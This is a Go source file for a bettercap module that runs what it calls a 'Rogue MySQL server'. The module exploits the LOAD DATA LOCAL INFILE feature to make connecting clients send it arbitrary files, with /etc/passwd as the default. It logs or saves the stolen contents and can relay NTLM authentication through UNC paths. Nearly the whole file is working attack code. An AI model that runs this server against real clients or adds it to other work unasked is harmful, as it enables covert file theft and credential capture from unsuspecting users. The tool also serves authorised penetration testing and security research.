package mysql_server

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"net"
	"strings"

	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"

	"github.com/evilsocket/islazy/tui"
)

type MySQLServer struct {
	session.SessionModule
	address  *net.TCPAddr
	listener *net.TCPListener
	infile   string
	outfile  string
}

func NewMySQLServer(s *session.Session) *MySQLServer {

	mysql := &MySQLServer{
		SessionModule: session.NewSessionModule("mysql.server", s),
	}

	mysql.AddParam(session.NewStringParameter("mysql.server.infile",
		"/etc/passwd",
		"",
		"File you want to read. UNC paths are also supported."))

	mysql.AddParam(session.NewStringParameter("mysql.server.outfile",
		"",
		"",
		"If filled, the INFILE buffer will be saved to this path instead of being logged."))

	mysql.AddParam(session.NewStringParameter("mysql.server.address",
		session.ParamIfaceAddress,
		session.IPv4Validator,
		"Address to bind the mysql server to."))

	mysql.AddParam(session.NewIntParameter("mysql.server.port",
		"3306",
		"Port to bind the mysql server to."))

	mysql.AddHandler(session.NewModuleHandler("mysql.server on", "",
		"Start mysql server.",
		func(args []string) error {
			return mysql.Start()
		}))

	mysql.AddHandler(session.NewModuleHandler("mysql.server off", "",
		"Stop mysql server.",
		func(args []string) error {
			return mysql.Stop()
		}))

	return mysql
}

func (mysql *MySQLServer) Name() string {
	return "mysql.server"
}

func (mysql *MySQLServer) Description() string {
	return "A simple Rogue MySQL server, to be used to exploit LOCAL INFILE and read arbitrary files from the client."
}

func (mysql *MySQLServer) Author() string {
	return "Bernardo Rodrigues (https://twitter.com/bernardomr)"
}

func (mysql *MySQLServer) Configure() error {
	var err error
	var address string
	var port int

	if mysql.Running() {
		return session.ErrAlreadyStarted
	} else if err, mysql.infile = mysql.StringParam("mysql.server.infile"); err != nil {
		return err
	} else if err, mysql.outfile = mysql.StringParam("mysql.server.outfile"); err != nil {
		return err
	} else if err, address = mysql.StringParam("mysql.server.address"); err != nil {
		return err
	} else if err, port = mysql.IntParam("mysql.server.port"); err != nil {
		return err
	} else if mysql.address, err = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%d", address, port)); err != nil {
		return err
	} else if mysql.listener, err = net.ListenTCP("tcp", mysql.address); err != nil {
		return err
	}
	return nil
}

func (mysql *MySQLServer) Start() error {
	if err := mysql.Configure(); err != nil {
		return err
	}

	return mysql.SetRunning(true, func() {
		mysql.Info("server starting on address %s", mysql.address)
		for mysql.Running() {
			if conn, err := mysql.listener.AcceptTCP(); err != nil {
				mysql.Warning("error while accepting tcp connection: %s", err)
				continue
			} else {
				defer conn.Close()

				// TODO: include binary support and files > 16kb
				clientAddress := strings.Split(conn.RemoteAddr().String(), ":")[0]
				readBuffer := make([]byte, 16384)
				reader := bufio.NewReader(conn)
				read := 0

				mysql.Info("connection from %s", clientAddress)

				if _, err := conn.Write(packets.MySQLGreeting); err != nil {
					mysql.Warning("error while writing server greeting: %s", err)
					continue
				} else if read, err = reader.Read(readBuffer); err != nil {
					mysql.Warning("error while reading client message: %s", err)
					continue
				}

				// parse client capabilities and validate connection
				// TODO: parse mysql connections properly and
				//       display additional connection attributes
				capabilities := fmt.Sprintf("%08b", (int(uint32(readBuffer[4]) | uint32(readBuffer[5])<<8)))
				loadData := string(capabilities[8])
				username := string(bytes.Split(readBuffer[36:], []byte{0})[0])

				mysql.Info("can use LOAD DATA LOCAL: %s", loadData)
				mysql.Info("login request username: %s", tui.Bold(username))

				if _, err := conn.Write(packets.MySQLFirstResponseOK); err != nil {
					mysql.Warning("error while writing server first response ok: %s", err)
					continue
				} else if _, err := reader.Read(readBuffer); err != nil {
					mysql.Warning("error while reading client message: %s", err)
					continue
				} else if _, err := conn.Write(packets.MySQLGetFile(mysql.infile)); err != nil {
					mysql.Warning("error while writing server get file request: %s", err)
					continue
				} else if read, err = reader.Read(readBuffer); err != nil {
					mysql.Warning("error while readind buffer: %s", err)
					continue
				}

				if strings.HasPrefix(mysql.infile, "\\") {
					mysql.Info("NTLM from '%s' relayed to %s", clientAddress, mysql.infile)
				} else if fileSize := read - 9; fileSize < 4 {
					mysql.Warning("unpexpected buffer size %d", read)
				} else {
					mysql.Info("read file ( %s ) is %d bytes", mysql.infile, fileSize)

					fileData := readBuffer[4 : read-4]

					if mysql.outfile == "" {
						mysql.Info("\n%s", string(fileData))
					} else {
						mysql.Info("saving to %s ...", mysql.outfile)
						if err := ioutil.WriteFile(mysql.outfile, fileData, 0755); err != nil {
							mysql.Warning("error while saving the file: %s", err)
						}
					}
				}

				conn.Write(packets.MySQLSecondResponseOK)
			}
		}
	})
}

func (mysql *MySQLServer) Stop() error {
	return mysql.SetRunning(false, func() {
		defer mysql.listener.Close()
	})
}
